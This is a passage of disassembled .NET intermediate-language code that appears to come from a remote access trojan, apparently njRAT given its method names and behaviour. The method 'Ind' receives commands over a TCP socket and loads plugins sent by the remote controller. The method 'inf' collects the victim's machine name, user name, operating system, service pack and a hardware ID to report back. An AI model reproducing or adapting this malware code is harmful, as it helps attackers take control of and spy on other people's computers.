        IL_0af0:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_0af5:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0afa:  call       bool j.OK::Send(string)
        IL_0aff:  pop
        IL_0b00:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0b05:  nop
        IL_0b06:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0b0b:  leave      IL_0dad

      }  // end handler
      IL_0b10:  nop
      IL_0b11:  call       void j.OK::UNS()
      IL_0b16:  nop
      IL_0b17:  leave      IL_0dad

      IL_0b1c:  nop
      IL_0b1d:  ldloc.2
      IL_0b1e:  ldstr      "Ex"
      IL_0b23:  ldc.i4.0
      IL_0b24:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0b29:  ldc.i4.0
      IL_0b2a:  ceq
      IL_0b2c:  stloc.s    V_56
      IL_0b2e:  ldloc.s    V_56
      IL_0b30:  brfalse    IL_0c10

      IL_0b35:  ldsfld     object j.OK::PLG
      IL_0b3a:  ldnull
      IL_0b3b:  ceq
      IL_0b3d:  stloc.s    V_59
      IL_0b3f:  ldloc.s    V_59
      IL_0b41:  brfalse.s  IL_0ba4

      IL_0b43:  ldstr      "PLG"
      IL_0b48:  call       bool j.OK::Send(string)
      IL_0b4d:  pop
      IL_0b4e:  ldc.i4.0
      IL_0b4f:  stloc.s    num5
      IL_0b51:  br.s       IL_0b65

      IL_0b53:  ldloc.s    num5
      IL_0b55:  ldc.i4.1
      IL_0b56:  add.ovf
      IL_0b57:  stloc.s    num5
      IL_0b59:  ldc.i4     0x3e8
      IL_0b5e:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0b63:  nop
      IL_0b64:  nop
      IL_0b65:  ldsfld     object j.OK::PLG
      IL_0b6a:  ldnull
      IL_0b6b:  cgt.un
      IL_0b6d:  ldloc.s    num5
      IL_0b6f:  ldc.i4.s   20
      IL_0b71:  ceq
      IL_0b73:  or
      IL_0b74:  ldsfld     bool j.OK::Cn
      IL_0b79:  ldc.i4.0
      IL_0b7a:  ceq
      IL_0b7c:  or
      IL_0b7d:  ldc.i4.0
      IL_0b7e:  ceq
      IL_0b80:  stloc.s    V_61
      IL_0b82:  ldloc.s    V_61
      IL_0b84:  brtrue.s   IL_0b53

      IL_0b86:  ldsfld     object j.OK::PLG
      IL_0b8b:  ldnull
      IL_0b8c:  ceq
      IL_0b8e:  ldsfld     bool j.OK::Cn
      IL_0b93:  ldc.i4.0
      IL_0b94:  ceq
      IL_0b96:  or
      IL_0b97:  stloc.s    V_62
      IL_0b99:  ldloc.s    V_62
      IL_0b9b:  brfalse.s  IL_0ba2

      IL_0b9d:  leave      IL_0dad

      IL_0ba2:  nop
      IL_0ba3:  nop
      IL_0ba4:  nop
      IL_0ba5:  ldc.i4.1
      IL_0ba6:  newarr     [mscorlib]System.Object
      IL_0bab:  dup
      IL_0bac:  ldc.i4.0
      IL_0bad:  ldarg.0
      IL_0bae:  stelem.ref
      IL_0baf:  stloc.s    arguments
      IL_0bb1:  ldc.i4.1
      IL_0bb2:  newarr     [mscorlib]System.Boolean
      IL_0bb7:  dup
      IL_0bb8:  ldc.i4.0
      IL_0bb9:  ldc.i4.1
      IL_0bba:  stelem.i1
      IL_0bbb:  stloc.s    copyBack
      IL_0bbd:  ldsfld     object j.OK::PLG
      IL_0bc2:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0bc7:  ldnull
      IL_0bc8:  ldstr      "ind"
      IL_0bcd:  ldloc.s    arguments
      IL_0bcf:  ldnull
      IL_0bd0:  ldnull
      IL_0bd1:  ldloc.s    copyBack
      IL_0bd3:  ldc.i4.1
      IL_0bd4:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_0bd9:  pop
      IL_0bda:  ldloc.s    copyBack
      IL_0bdc:  ldc.i4.0
      IL_0bdd:  ldelem.u1
      IL_0bde:  stloc.s    V_63
      IL_0be0:  ldloc.s    V_63
      IL_0be2:  brfalse.s  IL_0c09

      IL_0be4:  ldloc.s    arguments
      IL_0be6:  ldc.i4.0
      IL_0be7:  ldelem.ref
      IL_0be8:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0bed:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0bf2:  ldtoken    uint8[]
      IL_0bf7:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_0bfc:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_0c01:  castclass  uint8[]
      IL_0c06:  starg.s    b
      IL_0c08:  nop
      IL_0c09:  nop
      IL_0c0a:  nop
      IL_0c0b:  br         IL_0cec

      IL_0c10:  ldloc.2
      IL_0c11:  ldstr      "PLG"
      IL_0c16:  ldc.i4.0
      IL_0c17:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0c1c:  ldc.i4.0
      IL_0c1d:  ceq
      IL_0c1f:  stloc.s    V_64
      IL_0c21:  ldloc.s    V_64
      IL_0c23:  brfalse    IL_0cec

      IL_0c28:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0c2d:  stloc.s    stream7
      IL_0c2f:  ldloc.0
      IL_0c30:  ldc.i4.0
      IL_0c31:  ldelem.ref
      IL_0c32:  ldsfld     string j.OK::Y
      IL_0c37:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0c3c:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0c41:  stloc.s    num6
      IL_0c43:  ldloc.s    stream7
      IL_0c45:  ldarg.0
      IL_0c46:  ldloc.s    num6
      IL_0c48:  ldarg.0
      IL_0c49:  ldlen
      IL_0c4a:  conv.i4
      IL_0c4b:  ldloc.s    num6
      IL_0c4d:  sub.ovf
      IL_0c4e:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0c53:  nop
      IL_0c54:  ldloc.s    stream7
      IL_0c56:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0c5b:  call       uint8[] j.OK::ZIP(uint8[])
      IL_0c60:  ldstr      "A"
      IL_0c65:  call       object j.OK::Plugin(uint8[],
                                               string)
      IL_0c6a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0c6f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0c74:  stsfld     object j.OK::PLG
      IL_0c79:  ldsfld     object j.OK::PLG
      IL_0c7e:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0c83:  ldnull
      IL_0c84:  ldstr      "H"
      IL_0c89:  ldc.i4.1
      IL_0c8a:  newarr     [mscorlib]System.Object
      IL_0c8f:  dup
      IL_0c90:  ldc.i4.0
      IL_0c91:  ldsfld     string j.OK::H
      IL_0c96:  stelem.ref
      IL_0c97:  ldnull
      IL_0c98:  ldnull
      IL_0c99:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0c9e:  nop
      IL_0c9f:  ldsfld     object j.OK::PLG
      IL_0ca4:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0ca9:  ldnull
      IL_0caa:  ldstr      "P"
      IL_0caf:  ldc.i4.1
      IL_0cb0:  newarr     [mscorlib]System.Object
      IL_0cb5:  dup
      IL_0cb6:  ldc.i4.0
      IL_0cb7:  ldsfld     string j.OK::P
      IL_0cbc:  stelem.ref
      IL_0cbd:  ldnull
      IL_0cbe:  ldnull
      IL_0cbf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0cc4:  nop
      IL_0cc5:  ldsfld     object j.OK::PLG
      IL_0cca:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0ccf:  ldnull
      IL_0cd0:  ldstr      "c"
      IL_0cd5:  ldc.i4.1
      IL_0cd6:  newarr     [mscorlib]System.Object
      IL_0cdb:  dup
      IL_0cdc:  ldc.i4.0
      IL_0cdd:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0ce2:  stelem.ref
      IL_0ce3:  ldnull
      IL_0ce4:  ldnull
      IL_0ce5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0cea:  nop
      IL_0ceb:  nop
      IL_0cec:  leave      IL_0dac

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0cf1:  dup
      IL_0cf2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0cf7:  stloc.s    exception16
      IL_0cf9:  nop
      IL_0cfa:  ldloc.s    exception16
      IL_0cfc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0d01:  nop
      IL_0d02:  ldloc.s    exception16
      IL_0d04:  stloc.s    exception8
      IL_0d06:  ldloc.0
      IL_0d07:  ldlen
      IL_0d08:  conv.i4
      IL_0d09:  ldc.i4.0
      IL_0d0a:  ble.s      IL_0d31

      IL_0d0c:  ldloc.0
      IL_0d0d:  ldc.i4.0
      IL_0d0e:  ldelem.ref
      IL_0d0f:  ldstr      "Ex"
      IL_0d14:  ldc.i4.0
      IL_0d15:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0d1a:  ldc.i4.0
      IL_0d1b:  ceq
      IL_0d1d:  ldloc.0
      IL_0d1e:  ldc.i4.0
      IL_0d1f:  ldelem.ref
      IL_0d20:  ldstr      "PLG"
      IL_0d25:  ldc.i4.0
      IL_0d26:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0d2b:  ldc.i4.0
      IL_0d2c:  ceq
      IL_0d2e:  or
      IL_0d2f:  br.s       IL_0d32

      IL_0d31:  ldc.i4.0
      IL_0d32:  stloc.s    V_69
      IL_0d34:  ldloc.s    V_69
      IL_0d36:  brfalse.s  IL_0d3f

      IL_0d38:  ldnull
      IL_0d39:  stsfld     object j.OK::PLG
      IL_0d3e:  nop
      IL_0d3f:  nop
      .try
      {
        IL_0d40:  nop
        IL_0d41:  ldc.i4.5
        IL_0d42:  newarr     [mscorlib]System.String
        IL_0d47:  dup
        IL_0d48:  ldc.i4.0
        IL_0d49:  ldstr      "ER"
        IL_0d4e:  stelem.ref
        IL_0d4f:  dup
        IL_0d50:  ldc.i4.1
        IL_0d51:  ldsfld     string j.OK::Y
        IL_0d56:  stelem.ref
        IL_0d57:  dup
        IL_0d58:  ldc.i4.2
        IL_0d59:  ldloc.0
        IL_0d5a:  ldc.i4.0
        IL_0d5b:  ldelem.ref
        IL_0d5c:  stelem.ref
        IL_0d5d:  dup
        IL_0d5e:  ldc.i4.3
        IL_0d5f:  ldsfld     string j.OK::Y
        IL_0d64:  stelem.ref
        IL_0d65:  dup
        IL_0d66:  ldc.i4.4
        IL_0d67:  ldloc.s    exception8
        IL_0d69:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_0d6e:  stelem.ref
        IL_0d6f:  call       string [mscorlib]System.String::Concat(string[])
        IL_0d74:  call       bool j.OK::Send(string)
        IL_0d79:  pop
        IL_0d7a:  leave.s    IL_0d9e

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0d7c:  dup
        IL_0d7d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0d82:  stloc.s    exception17
        IL_0d84:  nop
        IL_0d85:  ldloc.s    exception17
        IL_0d87:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0d8c:  nop
        IL_0d8d:  ldloc.s    exception17
        IL_0d8f:  stloc.s    exception9
        IL_0d91:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0d96:  nop
        IL_0d97:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0d9c:  leave.s    IL_0d9e

      }  // end handler
      IL_0d9e:  nop
      IL_0d9f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0da4:  nop
      IL_0da5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0daa:  leave.s    IL_0dac

    }  // end handler
    IL_0dac:  nop
    IL_0dad:  ret
  } // end of method OK::Ind

  .method public static string  inf() cil managed
  {
    // Code size       1175 (0x497)
    .maxstack  4
    .locals init ([0] string inf,
             [1] string str2,
             [2] string str3,
             [3] bool V_3,
             [4] string V_4,
             [5] string V_5,
             [6] class [mscorlib]System.Exception exception1,
             [7] class [mscorlib]System.Exception exception,
             [8] class [mscorlib]System.Exception exception9,
             [9] class [mscorlib]System.Exception exception2,
             [10] class [mscorlib]System.Exception exception10,
             [11] class [mscorlib]System.Exception exception3,
             [12] valuetype [mscorlib]System.DateTime V_12,
             [13] class [mscorlib]System.Exception exception11,
             [14] class [mscorlib]System.Exception exception4,
             [15] class [mscorlib]System.Exception exception12,
             [16] class [mscorlib]System.Exception exception5,
             [17] string[] strArray,
             [18] bool V_18,
             [19] class [mscorlib]System.Exception exception13,
             [20] class [mscorlib]System.Exception exception6,
             [21] bool V_21,
             [22] class [mscorlib]System.Exception exception14,
             [23] class [mscorlib]System.Exception exception7,
             [24] bool V_24,
             [25] string str4,
             [26] string[] V_26,
             [27] int32 V_27,
             [28] bool V_28,
             [29] bool V_29,
             [30] class [mscorlib]System.Exception exception15,
             [31] class [mscorlib]System.Exception exception8)
    IL_0000:  nop
    IL_0001:  ldstr      "ll"
    IL_0006:  ldsfld     string j.OK::Y
    IL_000b:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0010:  stloc.1
    .try
    {
      IL_0011:  nop
      IL_0012:  ldstr      "vn"
      IL_0017:  ldstr      ""
      IL_001c:  call       object j.OK::GTV(string,
                                            object)
      IL_0021:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0026:  ldstr      ""
      IL_002b:  ldc.i4.0
      IL_002c:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                       object,
                                                                                                                                       bool)
      IL_0031:  stloc.3
      IL_0032:  ldloc.3
      IL_0033:  brfalse.s  IL_0066

      IL_0035:  ldloc.1
      IL_0036:  ldsflda    string j.OK::VN
      IL_003b:  call       string j.OK::DEB(string&)
      IL_0040:  ldstr      "_"
      IL_0045:  call       string j.OK::HWD()
      IL_004a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_004f:  stloc.s    V_4
      IL_0051:  ldloca.s   V_4
      IL_0053:  call       string j.OK::ENB(string&)
      IL_0058:  ldsfld     string j.OK::Y
      IL_005d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0062:  stloc.1
      IL_0063:  nop
      IL_0064:  br.s       IL_00ae

      IL_0066:  nop
      IL_0067:  ldloc.1
      IL_0068:  ldstr      "vn"
      IL_006d:  ldstr      ""
      IL_0072:  call       object j.OK::GTV(string,
                                            object)
      IL_0077:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_007c:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_0081:  stloc.s    V_5
      IL_0083:  ldloca.s   V_5
      IL_0085:  call       string j.OK::DEB(string&)
      IL_008a:  ldstr      "_"
      IL_008f:  call       string j.OK::HWD()
      IL_0094:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0099:  stloc.s    V_4
      IL_009b:  ldloca.s   V_4
      IL_009d:  call       string j.OK::ENB(string&)
      IL_00a2:  ldsfld     string j.OK::Y
      IL_00a7:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00ac:  stloc.1
      IL_00ad:  nop
      IL_00ae:  leave.s    IL_00ec

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00b0:  dup
      IL_00b1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00b6:  stloc.s    exception1
      IL_00b8:  nop
      IL_00b9:  ldloc.s    exception1
      IL_00bb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c0:  nop
      IL_00c1:  ldloc.s    exception1
      IL_00c3:  stloc.s    exception
      IL_00c5:  ldloc.1
      IL_00c6:  call       string j.OK::HWD()
      IL_00cb:  stloc.s    V_4
      IL_00cd:  ldloca.s   V_4
      IL_00cf:  call       string j.OK::ENB(string&)
      IL_00d4:  ldsfld     string j.OK::Y
      IL_00d9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00de:  stloc.1
      IL_00df:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00e4:  nop
      IL_00e5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00ea:  leave.s    IL_00ec

    }  // end handler
    IL_00ec:  nop
    .try
    {
      IL_00ed:  nop
      IL_00ee:  ldloc.1
      IL_00ef:  call       string [mscorlib]System.Environment::get_MachineName()
      IL_00f4:  ldsfld     string j.OK::Y
      IL_00f9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00fe:  stloc.1
      IL_00ff:  leave.s    IL_0134

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0101:  dup
      IL_0102:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0107:  stloc.s    exception9
      IL_0109:  nop
      IL_010a:  ldloc.s    exception9
      IL_010c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0111:  nop
      IL_0112:  ldloc.s    exception9
      IL_0114:  stloc.s    exception2
      IL_0116:  ldloc.1
      IL_0117:  ldstr      "\?\?"
      IL_011c:  ldsfld     string j.OK::Y
      IL_0121:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0126:  stloc.1
      IL_0127:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_012c:  nop
      IL_012d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0132:  leave.s    IL_0134

    }  // end handler
    IL_0134:  nop
    .try
    {
      IL_0135:  nop
      IL_0136:  ldloc.1
      IL_0137:  call       string [mscorlib]System.Environment::get_UserName()
      IL_013c:  ldsfld     string j.OK::Y
      IL_0141:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0146:  stloc.1
      IL_0147:  leave.s    IL_017c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0149:  dup
      IL_014a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_014f:  stloc.s    exception10
      IL_0151:  nop
      IL_0152:  ldloc.s    exception10
      IL_0154:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0159:  nop
      IL_015a:  ldloc.s    exception10
      IL_015c:  stloc.s    exception3
      IL_015e:  ldloc.1
      IL_015f:  ldstr      "\?\?"
      IL_0164:  ldsfld     string j.OK::Y
      IL_0169:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_016e:  stloc.1
      IL_016f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0174:  nop
      IL_0175:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_017a:  leave.s    IL_017c

    }  // end handler
    IL_017c:  nop
    .try
    {
      IL_017d:  nop
      IL_017e:  ldloc.1
      IL_017f:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0184:  callvirt   instance valuetype [mscorlib]System.DateTime [mscorlib]System.IO.FileSystemInfo::get_LastWriteTime()
      IL_0189:  stloc.s    V_12
      IL_018b:  ldloca.s   V_12
      IL_018d:  call       instance valuetype [mscorlib]System.DateTime [mscorlib]System.DateTime::get_Date()
      IL_0192:  stloc.s    V_12
      IL_0194:  ldloca.s   V_12
      IL_0196:  ldstr      "yy-MM-dd"
      IL_019b:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_01a0:  ldsfld     string j.OK::Y
      IL_01a5:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01aa:  stloc.1
      IL_01ab:  leave.s    IL_01e0

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01ad:  dup
      IL_01ae:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01b3:  stloc.s    exception11
      IL_01b5:  nop
      IL_01b6:  ldloc.s    exception11
      IL_01b8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01bd:  nop
      IL_01be:  ldloc.s    exception11
      IL_01c0:  stloc.s    exception4
      IL_01c2:  ldloc.1
      IL_01c3:  ldstr      "\?\?-\?\?-\?\?"
      IL_01c8:  ldsfld     string j.OK::Y
      IL_01cd:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01d2:  stloc.1
      IL_01d3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01d8:  nop
      IL_01d9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01de:  leave.s    IL_01e0

    }  // end handler
    IL_01e0:  nop
    IL_01e1:  ldloc.1
    IL_01e2:  ldsfld     string j.OK::Y
    IL_01e7:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_01ec:  stloc.1
    .try
    {
      IL_01ed:  nop
      IL_01ee:  ldloc.1
      IL_01ef:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_01f4:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Info()
      IL_01f9:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ComputerInfo::get_OSFullName()
      IL_01fe:  ldstr      "Microsoft"
      IL_0203:  ldstr      ""
      IL_0208:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_020d:  ldstr      "Windows"
      IL_0212:  ldstr      "Win"
      IL_0217:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_021c:  ldstr      bytearray (AE 00 ) 
      IL_0221:  ldstr      ""
      IL_0226:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_022b:  ldstr      bytearray (22 21 )                                           // "!
      IL_0230:  ldstr      ""
      IL_0235:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_023a:  ldstr      "  "
      IL_023f:  ldstr      " "
      IL_0244:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0249:  ldstr      " Win"
      IL_024e:  ldstr      "Win"
      IL_0253:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0258:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_025d:  stloc.1
      IL_025e:  leave.s    IL_028e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0260:  dup
      IL_0261:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0266:  stloc.s    exception12
      IL_0268:  nop
      IL_0269:  ldloc.s    exception12
      IL_026b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0270:  nop
      IL_0271:  ldloc.s    exception12
      IL_0273:  stloc.s    exception5
      IL_0275:  ldloc.1
      IL_0276:  ldstr      "\?\?"
      IL_027b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0280:  stloc.1
      IL_0281:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0286:  nop
      IL_0287:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_028c:  leave.s    IL_028e

    }  // end handler
    IL_028e:  nop
    IL_028f:  ldloc.1
    IL_0290:  ldstr      "SP"
    IL_0295:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_029a:  stloc.1
    .try
    {
      IL_029b:  nop
      IL_029c:  call       class [mscorlib]System.OperatingSystem [mscorlib]System.Environment::get_OSVersion()
      IL_02a1:  callvirt   instance string [mscorlib]System.OperatingSystem::get_ServicePack()
      IL_02a6:  ldstr      " "
      IL_02ab:  ldc.i4.m1
      IL_02ac:  ldc.i4.0
      IL_02ad:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                                string,
                                                                                                int32,
                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
      IL_02b2:  stloc.s    strArray
      IL_02b4:  ldloc.s    strArray
      IL_02b6:  ldlen
      IL_02b7:  conv.i4
      IL_02b8:  ldc.i4.1
      IL_02b9:  ceq
      IL_02bb:  stloc.s    V_18
      IL_02bd:  ldloc.s    V_18
      IL_02bf:  brfalse.s  IL_02ce

      IL_02c1:  ldloc.1
      IL_02c2:  ldstr      "0"
      IL_02c7:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_02cc:  stloc.1
      IL_02cd:  nop
      IL_02ce:  nop
      IL_02cf:  ldloc.1
      IL_02d0:  ldloc.s    strArray
      IL_02d2:  ldloc.s    strArray
      IL_02d4:  ldlen
      IL_02d5:  conv.i4
      IL_02d6:  ldc.i4.1
      IL_02d7:  sub.ovf
      IL_02d8:  ldelem.ref
      IL_02d9:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_02de:  stloc.1
      IL_02df:  leave.s    IL_030f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_02e1:  dup
      IL_02e2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02e7:  stloc.s    exception13
      IL_02e9:  nop
      IL_02ea:  ldloc.s    exception13
      IL_02ec:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_02f1:  nop
      IL_02f2:  ldloc.s    exception13
      IL_02f4:  stloc.s    exception6
      IL_02f6:  ldloc.1
      IL_02f7:  ldstr      "0"
      IL_02fc:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0301:  stloc.1
      IL_0302:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0307:  nop
      IL_0308:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_030d:  leave.s    IL_030f

    }  // end handler
    IL_030f:  nop
    .try
    {
